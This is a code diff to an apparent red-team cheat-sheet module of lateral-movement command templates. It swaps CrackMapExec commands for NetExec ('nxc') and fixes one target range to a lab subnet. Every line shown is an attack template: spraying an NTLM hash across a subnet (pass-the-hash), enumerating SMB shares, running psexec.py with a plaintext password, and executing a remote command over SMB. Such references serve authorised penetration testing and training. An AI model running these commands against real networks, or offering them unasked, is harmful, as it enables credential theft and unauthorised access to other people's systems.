@@ -1,11 +1,11 @@
 export const lateralMovementCommands = {
     techniques: [
         {
-            name: "Pass-the-Hash (CrackMapExec)",
+            name: "Pass-the-Hash (NetExec)",
             description: "Spray NTLM hash across the subnet or specific targets.",
             commands: [
-                "crackmapexec smb {{DC_IP}}/24 -u {{USERNAME}} -H {{NTLM_HASH}} --continue-on-success",
-                "crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -H {{NTLM_HASH}} --shares"
+                "nxc smb 192.168.56.0/24 -u {{USERNAME}} -H {{NTLM_HASH}} --continue-on-success",
+                "nxc smb {{TARGET_IP}} -u {{USERNAME}} -H {{NTLM_HASH}} --shares"
             ]
         },
         {
@@ -38,7 +38,7 @@ export const lateralMovementCommands = {
             description: "Execute processes on a remote system with plaintext credentials.",
             commands: [
                 "psexec.py {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}}",
-                "crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -x 'whoami'"
+                "nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -x 'whoami'"
             ]
         }
     ]
